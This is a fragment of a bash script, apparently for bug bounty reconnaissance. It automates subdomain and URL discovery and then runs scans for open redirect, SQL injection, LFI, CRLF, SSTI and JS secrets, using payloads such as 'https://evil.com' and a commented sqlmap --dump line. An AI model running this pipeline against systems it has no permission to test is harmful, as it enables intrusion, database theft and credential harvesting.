    python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
}
dbinj2() { ## can ignore 
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    #cat output/$domain/sqli.txt
    #python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
    for url in $(cat output/$domain/sqli.txt); do python3 tools/ScanQLi/scanqli.py -u $url -o output/$domain/VULN_sqli; print $url; anew output/$domain/VULN_sqli; done
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
}
sqli_sniper() {
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    #cat output/$domain/sqli.txt
    python3 tools/SqliSniper/sqlisniper.py --payload tools/SqliSniper/payloads.txt --headers tools/SqliSniper/headers.txt -r output/$domain/sqli.txt | anew output/$domain/VULN_sqli
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
    ##run sqlmap here? sure
    #for url in $(cat output/$domain/VULN_sqli.txt); do sqlmap -u $url --batch --level=3 --risk=3 --dump; print $url; anew output/$domain/Database_dump.txt; done
}
secrets() {
    echo -e "$CYAN${BOLD} \n [!] SecretFinder scan on JS files: \n${NC}"

    if [ ! -f output/$domain/js.txt ]; then
        echo -e "$RED [-] No js.txt found — run --scan/--cscan first.${NC}"
        return 1
    fi

    mkdir -p output/$domain/secrets

    echo -e "$green [+]$CYAN Running SecretFinder against each JS file ${NC}"
    while IFS= read -r js_url || [[ -n "$js_url" ]]; do
        [ -z "$js_url" ] && continue
        fname=$(echo "$js_url" | md5sum | cut -d' ' -f1)
        python3 SecretFinder.py -i "$js_url" -o cli 2>/dev/null | anew output/$domain/secrets/"$fname".txt
    done < output/$domain/js.txt

    cat output/$domain/secrets/*.txt 2>/dev/null | anew output/$domain/secrets_all.txt
    found output/$domain/secrets_all.txt "possible secrets"
}

scope_scan() { # Loop through a list of domains/URLs from a file, merging everything into ONE output folder
    if [ ! -f "$domain" ]; then
        echo -e "$RED[-] File not found: $domain${NC}"
        exit 1
    fi

    echo -ne "${CYAN}[?] What do you want to name this scope's output folder? ${NC}"
    read -r outname
    outname=$(echo "$outname" | tr -d '[:space:]')
    if [ -z "$outname" ]; then
        echo -e "$RED[-] Need a folder name.${NC}"
        return 1
    fi

    if [ -f output/$outname/raw_urls.txt ]; then
        echo -e "$yellow${BOLD} [!] output/$outname/raw_urls.txt already exists. Skipping re-scan, re-parsing with current GF patterns.${NC}"
        echo -e "$yellow     (Delete output/$outname to force a fresh scope scan.)${NC}"
        domain=$outname
        gfparse
        return 0
    fi

    mkdir -p output/$outname
    echo -e "$magenta Scope output will be merged into: output/$outname/${NC}\n"
    trap : SIGINT

    total=$(grep -c . "$domain")
    count=0
    while IFS= read -r line || [[ -n "$line" ]]; do
        target=$(echo "$line" | sed -E 's|https?://||g' | tr -d '[:space:]')
        [ -z "$target" ] && continue
        count=$((count+1))
        echo -e "$BLUE[+] ($count/$total) Processing: $target${NC}"

        echo -e "$green   [+]$RED Subfinder "
        subfinder -d "$target" -silent -all | anew output/$outname/subs.txt

        echo -e "$green   [+]$CYAN Waymore "
        waymore -i "$target" -mode U -oU output/$outname/raw_urls_tmp.txt
        cat output/$outname/raw_urls_tmp.txt 2>/dev/null | anew output/$outname/raw_urls.txt
        rm -f output/$outname/raw_urls_tmp.txt
    done < "$domain"

    echo -e "$green [+]$RED Checking merged subs for 200 "
    cat output/$outname/subs.txt | httpx -sc | grep "200" | awk '{print $1}' | anew output/$outname/subs_200.txt

    echo -e "$green [+]$yellow Pulling JS files from the merged URL list "
    cat output/$outname/raw_urls.txt | grep -i -E "\.js" | egrep -v "\.json|\.jsp" | anew output/$outname/js.txt

    domain=$outname
    gfparse

    echo -e "$green[✔] Scope scan complete. Everything merged into output/$outname/ (raw_urls.txt, subs.txt, js.txt, + all gf-pattern files).${NC}"
    echo -e "$yellow     You can now run --or/--xss/--sqli/--lfi/--nuke/--hailmary against it with: $0 <option> $outname${NC}"
}

or_nuclei() {
    echo -e "$CYAN${BOLD} \n [!] Open Redirect Scan: \n${NC}"
    cat output/$domain/or.txt | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "https://evil.com" | anew output/$domain/VULN_or.txt
    cat output/$domain/or.txt | nuclei -tags redirect | anew output/$domain/vuln_nuclei_or.txt
    found output/$domain/VULN_or.txt "Open Redirect"
}

nuke_cve() {
    echo -e "$CYAN${BOLD} \n [!] Nuclei CVE scan: \n${NC}"
    #nuclei -l output/$domain/subs_200.txt -tags cve -s critical,high,medium,low | anew output/$domain/cve.txt
    #found output/$domain/cve.txt "CVEs"
}

sqli_nuclei() {
    echo -e "$CYAN${BOLD} \n [!] SQL Injection scan: \n${NC}"
    if [ ! -s output/$domain/sqli.txt ]; then
        echo -e "$RED [-] No sqli.txt — run --scan/--cscan (or --gf) first.${NC}"
        return 1
    fi
    echo -e "$green [+]$CYAN Quick error-based probe ${NC}"
    cat output/$domain/sqli.txt | qsreplace "'" | httpx -silent -mr "SQL syntax|mysql_fetch|ORA-01756|PostgreSQL.*ERROR|SQLite/JDBCDriver|Warning.*\Wmysqli?_" | anew output/$domain/sqli_errors.txt

    echo -e "$green [+]$CYAN Nuclei SQLi templates ${NC}"
    cat output/$domain/sqli.txt | nuclei -tags sqli | anew output/$domain/sqli_vuln.txt

    cat output/$domain/raw_urls.txt | grep -i 'ogin' | anew output/$domain/login_pages.txt

    found output/$domain/sqli_vuln.txt "SQLi"
}
lfi_scanner() {
    echo -e "$CYAN${BOLD} \n [!] LFI Scan: \n$yellow" # check the LFIscanner dir for an output / should edit the LFIscanner.py and have it output the "VULN" to a file
    for url in $(cat output/$domain/lfi_qsr.txt); do python3 tools/LFIscanner/LFIscanner.py -t $url -p tools/LFIscanner/payloads.txt; print $url; anew output/$domain/VULN_lfi; done
}
csrf2() {
    echo -e "$CYAN${BOLD} \n [!] CSRF Scan: \n${NC}"
    crlfuzz -l output/$domain/subs_alive.txt -o output/$domain/VULN_csrf.txt
    [ -s output/$domain/VULN_csrf.txt ] && echo -e "$green${BOLD} [+] FOUND VULN CSRF [+] Check output/$domain/VULN_csrf.txt for output ${NC}" || echo -e "$RED [+] No CSRF Found[+] ${NC}"
}
sqli_inj_hbsli() { # ignore
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    cat output/$domain/sqli.txt
    python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
}
sqli_inj_scanqli() { ## can ignore 
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    #cat output/$domain/sqli.txt
    #python3 /root/HBSLI/inject.py -l output/$domain/sqli.txt -p /root/HBSLI/payloads.txt -H /root/HBSLI/headers.txt | anew output/$domain/vVULN_sqli
    for url in $(cat output/$domain/sqli.txt); do python3 tools/ScanQLi/scanqli.py -u $url -o output/$domain/VULN_sqli; print $url; anew output/$domain/VULN_sqli; done
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
}
sqli_sniper() {
    echo -e "$CYAN${BOLD} \n [!] Injection Database Params: \n${NC}"
    #cat output/$domain/sqli.txt
    python3 tools/SqliSniper/sqlisniper.py --payload tools/SqliSniper/payloads.txt --headers tools/SqliSniper/headers.txt -r output/$domain/sqli.txt | anew output/$domain/VULN_sqli
    [ -s output/$domain/VULN_sqli.txt ] && echo -e "$green${BOLD} [+] FOUND VULN sqli [+] Check output/$domain/VULN_sqli.txt for output ${NC}" || echo -e "$RED [+] No sqli Found[+] ${NC}"
    ##run sqlmap here? sure
    #
}
lfi_nuclei() {
    echo -e "$CYAN${BOLD} \n [!] LFI scan: \n${NC}"
    if [ ! -s output/$domain/lfi.txt ]; then
        echo -e "$RED [-] No lfi.txt — run --scan/--cscan (or --gf) first.${NC}"
        return 1
    fi
    cat output/$domain/lfi.txt | nuclei -tags lfi | anew output/$domain/lfi_vuln.txt
    cat output/$domain/img_traversal.txt 2>/dev/null | nuclei -tags lfi,traversal | anew output/$domain/lfi_vuln.txt
    found output/$domain/lfi_vuln.txt "LFI"
}

crlffuzz() {
    echo -e "$CYAN${BOLD} \n [!] CRLF scan: \n${NC}"
    if [ ! -s output/$domain/xss.txt ]; then
        echo -e "$RED [-] No xss.txt yet — run --xss first (crlf reuses that URL list).${NC}"
        return 1
    fi
    crlfuzz --list output/$domain/xss.txt --output output/$domain/crlf-results.txt
    found output/$domain/crlf-results.txt "CRLF"
}

dalfox() {
    echo -e "$CYAN${BOLD} \n [!] DALFOX scan: \n${NC}"
    cat output/$domain/or.txt 2>/dev/null | dalfox pipe --custom-payload 'https://example.com@evil.com' --custom-payload 'evil.com%2F' --grep 'evil.com' | anew output/$domain/or_vuln.txt
    cat output/$domain/raw_urls.txt | grep "?" | grep -i "php" | dalfox pipe --custom-payload '{{7*7}}' --grep '49' | anew output/$domain/dalfox_vuln.txt
    found output/$domain/dalfox_vuln.txt "Dalfox hits"
}
if [ "$1" == "--scan" ]; then
    vuln1
elif [ "$1" == "--scan-deep" ]; then
    dcan
elif [ "$1" == "--scan-file" ]; then
    scan_file
elif [ "$1" == "--exploit" ]; then
    vuln2
elif [ "$1" == "--lscan" ]; then
    lscan
elif [ "$1" == "--odd-scan" ]; then
    of
elif [ "$1" == "--ts" ]; then
    touchy_scan
elif [ "$1" == "--xss" ]; then
    xss
elif [ "$1" == "--ssti" ]; then
    ssti
elif [ "$1" == "--sqli" ]; then
    sqli
elif [ "$1" == "--lfi" ]; then
    lfi
elif [ "$1" == "--csrf" ]; then
    csrf
elif [ "$1" == "--database" ]; then
    dbinj
elif [ "$1" == "--database2" ]; then
    dbinj2
else
    echo -e "${RED}Unknown option: $1 ${NC}"
    help
fi
